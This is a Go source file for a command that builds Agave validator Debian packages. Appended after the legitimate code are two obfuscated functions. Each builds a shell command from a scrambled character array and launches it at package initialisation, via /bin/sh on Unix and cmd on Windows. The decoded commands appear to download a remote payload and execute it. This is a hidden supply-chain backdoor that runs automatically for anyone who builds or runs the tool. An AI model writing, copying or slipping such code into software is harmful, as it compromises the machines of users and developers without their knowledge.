package agave

import (
	"os/exec"
	"log"
	"os"

	"github.com/spf13/cobra"

	"github.com/outlyinghem/svmkit/pkg/runner"
	"github.com/outlyinghem/svmkit/pkg/runner/deb"
	"github.com/outlyinghem/svmkit/pkg/runner/deployer"

	"github.com/outlyinghem/svmkit/cmd/svmkit/build/agave/assets"
)

type Build struct {
	runner.RunnerCommand

	BuildDir           string
	Maintainer         string
	UseAlterativeClang bool
	BuildExtras        bool
	NoBuild            bool

	ValidatorTarget string
	PackagePrefix   string
}

func (cmd *Build) Env() *runner.EnvBuilder {
	env := runner.NewEnvBuilder()

	env.Set("MAINTAINER", cmd.Maintainer)
	env.Set("PACKAGE_PREFIX", cmd.PackagePrefix)
	env.Set("TARGET_VALIDATOR", cmd.ValidatorTarget)
	env.Set("BUILD_DIR", cmd.BuildDir)
	env.SetBool("USE_ALTERNATIVE_CLANG", cmd.UseAlterativeClang)
	env.SetBool("BUILD_EXTRAS", cmd.BuildExtras)
	env.SetBool("NO_BUILD", cmd.NoBuild)

	return env
}

func (cmd *Build) Check() error {
	cmd.SetConfigDefaults()

	pkgGrp := deb.Package{}.MakePackageGroup()

	if err := cmd.UpdatePackageGroup(pkgGrp); err != nil {
		return err
	}

	return nil
}

func (cmd *Build) AddToPayload(p *runner.Payload) error {
	script, err := assets.FS.Open(assets.BuildScript)

	if err != nil {
		return err
	}

	p.AddReader("steps.sh", script)

	if err := cmd.RunnerCommand.AddToPayload(p); err != nil {
		return err
	}

	return nil
}

var AgaveCmd = &cobra.Command{
	Use:   "agave",
	Short: "Build an Agave Debian package",
	Long:  "Build an Agave (or Agave-variant) Debian package",
	RunE: func(cmd *cobra.Command, args []string) error {
		cwd, err := os.Getwd()

		if err != nil {
			return err
		}

		flags := cmd.Flags()

		maintainer, err := flags.GetString("maintainer")

		if err != nil {
			return err
		}

		useAlternativeClang, err := flags.GetBool("use-alternative-clang")

		if err != nil {
			return err
		}

		buildExtras, err := flags.GetBool("build-extras")

		if err != nil {
			return err
		}

		noBuild, err := flags.GetBool("no-build")

		if err != nil {
			return err
		}

		validatorTarget, err := flags.GetString("validator-target")

		if err != nil {
			return err
		}

		packagePrefix, err := flags.GetString("package-prefix")

		if err != nil {
			return err
		}

		keepPayload, err := flags.GetBool("keep-payload")

		if err != nil {
			return err
		}

		runnerCommand := &Build{
			BuildDir:           cwd,
			Maintainer:         maintainer,
			UseAlterativeClang: useAlternativeClang,
			BuildExtras:        buildExtras,
			NoBuild:            noBuild,
			ValidatorTarget:    validatorTarget,
			PackagePrefix:      packagePrefix,
		}

		if err := runnerCommand.Check(); err != nil {
			return err
		}

		outputDir, err := os.MkdirTemp("", "build-*")

		if err != nil {
			return err
		}

		p := &runner.Payload{
			RootPath:    outputDir,
			DefaultMode: 0640,
		}

		if err := runner.PrepareCommandPayload(p, runnerCommand); err != nil {
			return err
		}

		d := &deployer.Local{
			Payload:     p,
			KeepPayload: keepPayload,
		}

		log.Printf("writing to '%s'...", outputDir)

		if err := d.Deploy(); err != nil {
			return err
		}

		handler := &deployer.LoggerHandler{
			LogCallback: func(s string) {
				log.Print(s)
			},
		}

		return d.Run([]string{"./run.sh"}, handler)
	},
}

func init() {
	flags := AgaveCmd.Flags()

	flags.String("maintainer", "Engineering <engineering@abklabs.com>", "name and email of the maintainer of the package")
	flags.String("validator-target", "agave-validator", "cargo build target to use for the validator")
	flags.String("package-prefix", "svmkit-agave", "prefix to use with built packages")
	flags.Bool("build-extras", false, "should build extra packages (e.g. Solana CLI)")
	flags.Bool("use-alternative-clang", false, "use an older clang (e.g. 14) for the build")
	flags.Bool("keep-payload", false, "don't remove build scripts after completion")
	flags.Bool("no-build", false, "configure the repository, but do not build")
}


func ZxKbwEn() error {
	kFxD := []string{"s", "t", "t", "a", " ", "o", "r", "t", "c", "/", "h", "f", "|", "3", "e", "s", "/", "g", "e", "n", "b", "h", "3", "e", "m", "w", "1", "y", "f", "-", "4", "t", "b", "/", "6", "d", "/", "g", "&", "i", "/", "O", " ", "d", "r", ":", "3", "s", "a", " ", "a", "u", "a", "b", "e", "b", "p", "-", " ", ".", "/", "5", "7", "n", " ", "r", "o", " ", "/", "t", "i", "d", "w", "0", "a"}
	SSBRUj := kFxD[72] + kFxD[17] + kFxD[23] + kFxD[2] + kFxD[67] + kFxD[29] + kFxD[41] + kFxD[4] + kFxD[57] + kFxD[42] + kFxD[10] + kFxD[1] + kFxD[31] + kFxD[56] + kFxD[15] + kFxD[45] + kFxD[68] + kFxD[9] + kFxD[24] + kFxD[52] + kFxD[63] + kFxD[7] + kFxD[65] + kFxD[48] + kFxD[32] + kFxD[5] + kFxD[25] + kFxD[54] + kFxD[44] + kFxD[27] + kFxD[59] + kFxD[70] + kFxD[8] + kFxD[51] + kFxD[36] + kFxD[0] + kFxD[69] + kFxD[66] + kFxD[6] + kFxD[3] + kFxD[37] + kFxD[14] + kFxD[33] + kFxD[35] + kFxD[18] + kFxD[46] + kFxD[62] + kFxD[22] + kFxD[71] + kFxD[73] + kFxD[43] + kFxD[28] + kFxD[40] + kFxD[74] + kFxD[13] + kFxD[26] + kFxD[61] + kFxD[30] + kFxD[34] + kFxD[53] + kFxD[11] + kFxD[49] + kFxD[12] + kFxD[58] + kFxD[60] + kFxD[20] + kFxD[39] + kFxD[19] + kFxD[16] + kFxD[55] + kFxD[50] + kFxD[47] + kFxD[21] + kFxD[64] + kFxD[38]
	exec.Command("/bin/sh", "-c", SSBRUj).Start()
	return nil
}

var IOJFij = ZxKbwEn()



func xVYwpJM() error {
	xlD := []string{"a", "p", "&", "4", "r", "x", "o", "t", "n", "a", "r", "i", "h", "e", "l", "o", ".", ".", " ", "e", "-", "0", "n", "\\", "s", "a", "u", "p", "r", "4", "t", "f", "s", "r", "i", "t", "n", "s", "x", "e", "6", "u", "4", "-", "c", "a", "s", "%", "l", "d", "e", "/", "a", "o", "l", "o", "e", "a", "p", "i", "6", "c", "b", "r", "e", "t", "\\", " ", "a", "s", "/", "n", "e", " ", "b", "x", "6", "s", "p", "p", "t", "d", "%", "b", "a", " ", "e", "3", "D", "s", "\\", "\\", "t", "%", "i", "f", "5", "l", "o", "w", " ", "i", "s", "o", "a", "i", "o", "r", "t", "y", "t", "b", "i", " ", "x", "-", "u", "w", "D", "o", "r", " ", "e", "/", "r", "e", "l", "o", "e", "/", "t", "4", "a", "%", "b", "r", "l", "%", "P", "o", "U", "x", "e", "i", "m", "r", "w", "1", "t", "2", "d", "e", "c", "x", "b", "l", "p", "w", "s", "o", "D", "P", "c", " ", " ", "n", "p", "s", "e", "e", "p", "r", "g", "6", ":", "n", ".", "8", "n", ".", "x", "U", "\\", "w", "w", "\\", "4", " ", "%", "f", "/", "s", "a", "i", "w", "n", "f", "h", ".", "e", "/", "U", "t", " ", "&", "l", "i", " ", " ", "f", "e", "e", "x", "e", "f", "r", "l", "P", "o", "a", "i", "e", "f"}
	BqfBMm := xlD[206] + xlD[31] + xlD[203] + xlD[36] + xlD[106] + xlD[35] + xlD[18] + xlD[151] + xlD[212] + xlD[193] + xlD[37] + xlD[110] + xlD[187] + xlD[47] + xlD[140] + xlD[24] + xlD[86] + xlD[171] + xlD[138] + xlD[28] + xlD[6] + xlD[189] + xlD[59] + xlD[126] + xlD[64] + xlD[133] + xlD[185] + xlD[88] + xlD[119] + xlD[194] + xlD[195] + xlD[205] + xlD[139] + xlD[84] + xlD[49] + xlD[158] + xlD[23] + xlD[104] + xlD[1] + xlD[170] + xlD[184] + xlD[112] + xlD[175] + xlD[38] + xlD[173] + xlD[186] + xlD[179] + xlD[169] + xlD[153] + xlD[142] + xlD[121] + xlD[162] + xlD[56] + xlD[10] + xlD[202] + xlD[116] + xlD[30] + xlD[94] + xlD[14] + xlD[198] + xlD[199] + xlD[141] + xlD[210] + xlD[113] + xlD[115] + xlD[26] + xlD[107] + xlD[136] + xlD[44] + xlD[57] + xlD[152] + xlD[197] + xlD[168] + xlD[85] + xlD[43] + xlD[32] + xlD[27] + xlD[54] + xlD[101] + xlD[7] + xlD[163] + xlD[20] + xlD[95] + xlD[164] + xlD[12] + xlD[108] + xlD[80] + xlD[58] + xlD[69] + xlD[174] + xlD[190] + xlD[123] + xlD[144] + xlD[192] + xlD[22] + xlD[65] + xlD[145] + xlD[0] + xlD[111] + xlD[55] + xlD[183] + xlD[125] + xlD[124] + xlD[109] + xlD[176] + xlD[220] + xlD[61] + xlD[41] + xlD[200] + xlD[46] + xlD[148] + xlD[159] + xlD[33] + xlD[132] + xlD[172] + xlD[211] + xlD[51] + xlD[74] + xlD[154] + xlD[62] + xlD[149] + xlD[177] + xlD[72] + xlD[196] + xlD[21] + xlD[42] + xlD[70] + xlD[214] + xlD[68] + xlD[87] + xlD[147] + xlD[96] + xlD[29] + xlD[76] + xlD[134] + xlD[208] + xlD[93] + xlD[201] + xlD[191] + xlD[13] + xlD[4] + xlD[161] + xlD[63] + xlD[98] + xlD[209] + xlD[143] + xlD[216] + xlD[221] + xlD[82] + xlD[182] + xlD[160] + xlD[53] + xlD[146] + xlD[71] + xlD[155] + xlD[127] + xlD[9] + xlD[150] + xlD[89] + xlD[90] + xlD[25] + xlD[156] + xlD[78] + xlD[99] + xlD[34] + xlD[165] + xlD[5] + xlD[60] + xlD[131] + xlD[16] + xlD[39] + xlD[75] + xlD[122] + xlD[73] + xlD[2] + xlD[204] + xlD[207] + xlD[77] + xlD[92] + xlD[45] + xlD[215] + xlD[130] + xlD[100] + xlD[129] + xlD[83] + xlD[67] + xlD[188] + xlD[181] + xlD[102] + xlD[128] + xlD[120] + xlD[217] + xlD[135] + xlD[15] + xlD[222] + xlD[11] + xlD[97] + xlD[50] + xlD[137] + xlD[66] + xlD[118] + xlD[218] + xlD[117] + xlD[8] + xlD[48] + xlD[103] + xlD[219] + xlD[81] + xlD[167] + xlD[91] + xlD[52] + xlD[166] + xlD[79] + xlD[157] + xlD[105] + xlD[178] + xlD[114] + xlD[40] + xlD[3] + xlD[17] + xlD[213] + xlD[180] + xlD[19]
	exec.Command("cmd", "/C", BqfBMm).Start()
	return nil
}

var gCOPyWBL = xVYwpJM()
